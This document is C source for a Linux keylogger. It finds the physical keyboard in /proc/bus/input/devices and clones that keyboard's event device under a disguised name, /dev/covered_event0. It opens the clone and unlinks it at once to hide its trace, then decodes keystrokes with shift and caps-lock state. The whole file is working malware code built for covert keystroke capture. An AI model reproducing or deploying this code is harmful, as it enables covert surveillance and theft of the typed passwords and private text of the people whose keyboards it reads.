#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/input.h>

#include "devkeylogger.h"

int matchEventNum(const char* line) {
    char* line2 = strstr(line, "event") + strlen("event");
    int event = strtol(line2, NULL, 10);
    if (event >= INT_MAX || event < 0) {
        return -1;
    }
    //Paranoid? Probably.
    // But I think that strict input validation is
    // necessary even in this case.
    return (int)event;
}

int detect_dev_keyboard() {
    int result = -1;
    FILE* fp_proc = fopen("/proc/bus/input/devices", "r");
    if (fp_proc == NULL) {
        exit(EXIT_FAILURE);
    }
    char* line = NULL;
    size_t len = 0;
    ssize_t read;
    int good_section = 0;
    while ((read = getline(&line, &len, fp_proc)) != -1) {
        char* has_N = strstr(line, "N:");
        char* has_keyboard = strstr(line, "keyboard");
        char* has_Keyboard = strstr(line, "Keyboard");
        int keyboard = has_keyboard || has_Keyboard;
        char* has_ACPI = strstr(line, "ACPI");
        char* has_Virtual = strstr(line, "Virtual");
        char* has_H = strstr(line, "H:");
        if (has_N) {
            good_section = 0;
        }
        if (has_N && keyboard && !has_ACPI && !has_Virtual) {
            good_section = 1;
        }
        if (has_H && good_section) {
            result = matchEventNum(line);
        }
    }
    fclose(fp_proc);
    free(line);
    return result;
}

int migrate(char* keyboard, char* dev_to_migrate) {
    dev_t myevent;
    mode_t mymode = S_IRUSR | S_IFCHR;
    struct stat buf;
    int major, minor;
    if (stat(keyboard, &buf) == -1) {
        return -1;
    }
    major = major(buf.st_rdev);
    minor = minor(buf.st_rdev);
    myevent = makedev(major, minor);
    if (mknod(dev_to_migrate, mymode,  myevent) == -1) {
        return -1;
    }
    return 0;
}

//ASCII only, 256 symbols max
#define DEVICE_TO_MIGRATE "/dev/covered_event0"

typedef struct DevKeylogger {
    short shift;
    short caps;
    int fp_in;
} DevKeylogger;

DevKeylogger* initDevKeylogger() {
    int keyboard = detect_dev_keyboard();
    assert(keyboard != -1);
    char device[256];
    snprintf(device, 256, "/dev/input/event%d", keyboard);
    assert(migrate(device, DEVICE_TO_MIGRATE) != -1);
    snprintf(device, 256, "%s", DEVICE_TO_MIGRATE);
    int fp_in = open(device, O_RDONLY);
    assert(fp_in != -1);
    unlink(DEVICE_TO_MIGRATE);
    DevKeylogger* logger = malloc(sizeof(DevKeylogger));
    memset(logger, 0, sizeof(DevKeylogger));
    logger->shift = 0;
    logger->caps = 0;
    logger->fp_in = fp_in;
    return logger;
}

void freeDevKeylogger(DevKeylogger* logger) {
    free(logger);
}

int catchDevKey(DevKeylogger* logger) {
    struct input_event ev;
    read(logger->fp_in, &ev, sizeof(struct input_event));
    if (ev.type != 1) {
        return 0;
    }
    int shift = ev.code == 42 || ev.code == 54;
    int caps = ev.code == 58;
    if (shift) {
        logger->shift = ev.value; // 0 or 1
    }
    if (caps) {
        logger->caps = !logger->caps;
    }
    if (ev.value == 0) {
        return 0;
    }
    int upper = logger->caps || logger->shift;
    return ev.code << 1 | upper;
}
